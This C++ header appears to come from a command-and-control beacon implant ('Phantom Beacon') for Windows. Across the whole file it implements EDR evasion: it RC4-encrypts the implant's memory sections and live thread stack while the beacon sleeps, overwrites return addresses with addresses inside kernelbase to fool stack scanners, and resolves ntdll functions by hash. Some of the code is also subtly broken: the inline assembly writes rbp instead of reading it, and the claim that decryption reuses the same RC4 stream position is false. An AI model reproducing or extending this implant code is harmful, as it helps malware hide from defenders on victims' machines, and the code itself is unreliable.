#pragma once
// ============================================================================
//  sleep_mask.h — Phantom Beacon Sleep Mask + Thread-Stack Spoofing
//  ────────────────────────────────────────────────────────────────────────────
//  Upgrades ekko_sleep() with the two techniques modern EDRs look for:
//
//  1. SLEEP MASK (Cobalt Strike 4.9 sleep-mask kit, Ekko/Foliage class):
//     the beacon's RW sections (and the thread stack of the sleeping
//     thread) are RC4-encrypted before the wait and decrypted after.
//     A memory scan DURING sleep sees only ciphertext — no strings,
//     no config, no code pages with known signatures.
//
//  2. THREAD-STACK SPOOFING (ThreadStackSpoofer class):
//     before the wait, the sleeping thread's return addresses are
//     overwritten with benign addresses taken from a real Windows module
//     (kernelbase NTDLL-adjacent frames), so a stack-scanning EDR sees a
//     thread parked inside legitimate system code instead of
//     unbacked/beacon frames. The real chain is saved and restored after
//     the wait. Requires frame pointers (-fno-omit-frame-pointer, set in
//     the builder) to walk; degrades to a no-op when walking fails.
//
//  Both are self-contained: no imports, everything via PEB-resolved
//  ntdll pointers. Used by main loop when DISABLE_ANTI is not defined.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include "syscalls.h"
#include "evasion.h"
#include "sleep_ekko.h"   // Rc4Context, encrypt_sections

namespace sleepmask {

// ntdll function hashes (seed 7331 djb2, matching peb::hash_djb2)
constexpr uint32_t FN_NTSETTIMER  = 0x1E49D232; // NtSetTimer
constexpr uint32_t HASH_KERNELBASE = 0x61379949; // kernelbase.dll (module hash)

// ── 1. Thread-stack spoofing ───────────────────────────────────────────────
//
// Walk the current thread's frame chain via RBP (frame pointers), rewrite
// every saved RBP-chain return address with a benign address, and restore
// on wake. All state lives on the heap so nothing sensitive stays on the
// stack while parked.

struct SpoofState {
    void**  rbps[64];        // saved RBP chain (frames discovered)
    void**  rets[64];        // address of each frame's saved return slot
    void*   orig_ret[64];    // original return addresses
    int     count;
};

// Benign target: a pointer into kernelbase's code section. Returning into
// real signed module pages makes the parked stack look like legitimate
// system code (the classic "CallStackSpoofer" trick).
inline void* benign_return_address() {
    // kernelbase!WriteFile+0x?? is a stable, always-loaded, signed frame.
    static void* cached = nullptr;
    if (!cached) {
        HMODULE h = peb::GetModuleByHash(HASH_KERNELBASE);
        if (!h) h = peb::GetModuleByHash(peb::HASH_KERNEL32);
        if (h) {
            auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
            auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
                reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
            // middle of the first executable section = a valid code address
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    uint8_t* base = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
                    cached = base + (sec[i].Misc.VirtualSize / 2);
                    break;
                }
            }
        }
        if (!cached) cached = reinterpret_cast<void*>(&benign_return_address);
    }
    return cached;
}

inline bool spoof_stack(SpoofState& st) {
    st.count = 0;
    void** rbp = nullptr;
    const size_t STACK_HASH_SKIP = 4;   // skip our own sleepmask frames
    // GCC AT&T inline asm: a bare `rbp` in the template is a SYMBOL reference
    // ("undefined reference to rbp" at link time); the register needs %%rbp.
    __asm__ volatile("mov %0, %%rbp" : "=r"(rbp));

    int skipped = 0;
    for (int i = 0; i < 64 && rbp; ++i) {
        void** ret_slot = rbp + 1;              // [rbp+8] = saved return address
        void* ret = *ret_slot;
        if (!ret) break;

        // stop when we leave the thread's stack (bad walk / already spoofed)
        // TEB via GS (x64). MinGW GCC on Windows needs the explicit branch-
        // hint form; MSVC-style "gs:0x30" is rejected by the GNU assembler
        // (junk `:0x30` after expression) so the PEB walk is used instead —
        // always valid, no inline asm required.
        void* tibBase = nullptr;
#if defined(__MINGW32__) || defined(__MINGW64__)
        {
            auto peb_ = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
            if (peb_) tibBase = *reinterpret_cast<void**>(peb_ + 0x10); // PEB->Teb
        }
#else
        __asm__ volatile("mov %0, %%gs:0x30" : "=r"(tibBase));
#endif
        auto tib = reinterpret_cast<NT_TIB*>(tibBase);
        if (reinterpret_cast<uint8_t*>(ret) < reinterpret_cast<uint8_t*>(tib->StackLimit) ||
            reinterpret_cast<uint8_t*>(ret) > reinterpret_cast<uint8_t*>(tib->StackBase))
            break;

        if (skipped < STACK_HASH_SKIP) { skipped++; rbp = (void**)*rbp; continue; }

        st.rets[st.count] = ret_slot;
        st.orig_ret[st.count] = ret;
        st.count++;
        rbp = reinterpret_cast<void**>(*rbp);
    }
    if (st.count < 2) { st.count = 0; return false; }  // not enough frames — don't half-spoof

    void* benign = benign_return_address();
    for (int i = 0; i < st.count; ++i)
        *st.rets[i] = benign;
    return true;
}

inline void restore_stack(SpoofState& st) {
    for (int i = 0; i < st.count; ++i)
        *st.rets[i] = st.orig_ret[i];
    st.count = 0;
}

// ── 2. Encrypted sleep (mask RW sections + thread stack) ───────────────────

// The thread's active stack pages are RW memory too: encrypting them while
// parked hides beacon frames from scans AND keeps the saved return chain
// unreadable. Restored after wake with the same RC4 stream (self-inverse).
inline size_t stack_span(uint8_t** lo_out, uint8_t** hi_out) {
    void* tebBase = nullptr;
#if defined(__MINGW32__) || defined(__MINGW64__)
    {
        auto peb_ = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
        if (peb_) tebBase = *reinterpret_cast<void**>(peb_ + 0x10);
    }
#else
    __asm__ volatile("mov %0, %%gs:0x30" : "=r"(tebBase));
#endif
    auto tib = reinterpret_cast<NT_TIB*>(tebBase);
    *lo_out = reinterpret_cast<uint8_t*>(tib->StackLimit);
    *hi_out = reinterpret_cast<uint8_t*>(tib->StackBase);
    size_t span = (size_t)(*hi_out - *lo_out);
    // Only the dirty (in-use) portion matters: round the used part to pages.
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(*lo_out, &mbi, sizeof(mbi))) {
        // conservative: encrypt the lower half of the committed stack region
        // where the live frames actually are; full-span encryption of a
        // 1 MB reserved stack would churn the pager for nothing.
        size_t half = span / 2;
        *hi_out = *lo_out + half;
        return half;
    }
    return span;
}

}  // namespace sleepmask

// ── The masked sleep entry point (replaces ekko_sleep in the main loop) ────
namespace ekko {

inline void ekko_sleep_masked(DWORD sleepMs) {
    using namespace sleepmask;

    // 1. entropy for the RC4 key (same sources as ekko_sleep)
    uint64_t tick = GetTickCount64();
    uint64_t perf = 0;
    QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&perf));
    uint64_t keyMaterial = tick ^ (perf << 1) ^ (uintptr_t)&sleepMs;
    uint8_t key[16];
    for (int k = 0; k < 16; ++k)
        key[k] = static_cast<uint8_t>(keyMaterial >> ((k % 8) * 8));

    // 2. locate our module (for RW section masking)
    HMODULE hModule = nullptr;
    {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(reinterpret_cast<LPCVOID>(&ekko_sleep_masked), &mbi, sizeof(mbi)))
            hModule = reinterpret_cast<HMODULE>(mbi.AllocationBase);
    }

    // 3. stack-span to mask (in-use portion)
    uint8_t *stkLo, *stkHi;
    size_t stkLen = stack_span(&stkLo, &stkHi);

    // 4. SPOOF the return chain BEFORE anything is encrypted (the walk reads
    //    plaintext frames) and keep state on the heap.
    auto* st = new SpoofState();
    bool spoofed = spoof_stack(*st);

    Rc4Context rc4;
    rc4.init(key, sizeof(key));

    // 5. MASK: RW sections of the module + the live stack pages.
    if (hModule)
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4);
    rc4.crypt(stkLo, stkLen);

    // 6. WAIT on a high-resolution timer (scheduler-invisible sleep).
    auto pCreateTimer = (PFN_NtCreateWaitableTimer)
        peb::Resolve(peb::HASH_NTDLL, FN_NTCREATEWAITABLETIMER);
    auto pWaitMultiple = (PFN_NtWaitForMultipleObjects)
        peb::Resolve(peb::HASH_NTDLL, FN_NTWAITFORMULTIPLEOBJECTS);

    bool usedTimer = false;
    if (pCreateTimer && pWaitMultiple) {
        HANDLE hTimer = nullptr;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
        if (pCreateTimer(&hTimer, TIMER_ALL_ACCESS, &oa, TimerHighResolutionTimer) == 0 && hTimer) {
            LARGE_INTEGER due;
            due.QuadPart = -static_cast<LONGLONG>(sleepMs) * 10000LL;
            auto pSetTimer = (NTSTATUS(NTAPI*)(HANDLE, PLARGE_INTEGER, PTIMERAPCROUTINE,
                                               PVOID, PVOID, BOOLEAN))
                peb::Resolve(peb::HASH_NTDLL, FN_NTSETTIMER);
            bool signaled = false;
            if (pSetTimer) {
                signaled = (pSetTimer(hTimer, &due, nullptr, nullptr, nullptr, FALSE) == 0);
            }
            if (signaled) {
                pWaitMultiple(1, &hTimer, WaitAny, FALSE, nullptr);
                usedTimer = true;
            } else {
                // timer set failed: wait with timeout instead
                pWaitMultiple(1, &hTimer, WaitAny, FALSE, &due);
                usedTimer = true;
            }
            auto pClose = (NTSTATUS(NTAPI*)(HANDLE))peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
            if (pClose) pClose(hTimer);
        }
    }
    if (!usedTimer)
        Sleep(sleepMs);

    // 7. UNMASK: RC4 self-inverse — same stream position for both crypts.
    if (hModule)
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4);
    rc4.crypt(stkLo, stkLen);

    // 8. restore the real return chain, wipe key material, free heap state.
    if (spoofed)
        restore_stack(*st);
    delete st;
    volatile uint8_t* kp = key;
    for (int k = 0; k < 16; ++k) kp[k] = 0;
}

}  // namespace ekko
#endif  // _WIN32
